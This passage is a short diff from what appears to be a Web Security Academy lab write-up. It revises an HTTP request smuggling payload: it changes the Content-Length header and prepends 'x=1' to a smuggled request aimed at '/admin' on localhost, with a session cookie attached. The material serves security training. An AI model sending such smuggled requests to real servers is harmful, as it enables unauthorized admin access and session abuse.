@@ -112,9 +112,9 @@ Cookie: session=Nj2JXsk6Y8Nzr8JMd2z0N18bLRglPmDs
 ```http
 GET /admin HTTP/1.1
 Host: localhost
-Content-Length: 5
+Content-Length: 10
 
-POST / HTTP/1.1
+x=1POST / HTTP/1.1
 Host: 0a9100540483340d858b121a00730099.web-security-academy.net
 Cookie: session=Nj2JXsk6Y8Nzr8JMd2z0N18bLRglPmDs
 ...
